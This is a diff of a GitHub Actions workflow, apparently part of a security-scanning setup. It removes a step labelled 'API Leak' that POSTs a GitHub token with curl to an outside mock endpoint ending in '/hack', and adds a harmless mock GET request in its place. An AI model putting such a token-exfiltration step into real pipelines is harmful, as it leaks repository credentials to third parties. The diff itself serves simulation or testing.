@@ -79,8 +79,11 @@ jobs:
       with:
           github-token: ${{ secrets.GITHUB_TOKEN }}
           SCAN_ID: ${{ needs.create_scan_in_IR_Portal.outputs.scan_id }}
-    - name: API Leak
-      run: curl -k -X POST https://vbirmock.free.beeceptor.com/hack \  -H "Content-Type:application/json" \  -d '{  "GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}'
+    - name: Simulate API key leak (mock API request)
+      run: |
+        # Simulate a "leak" by sending a request to a mock API
+        curl -sSL "https://mockbin.org/bin/your-generated-bin-id" > response.json
+        cat response.json
     - name: Checkout the code
       uses: actions/checkout@v3
     - name: Run pip install
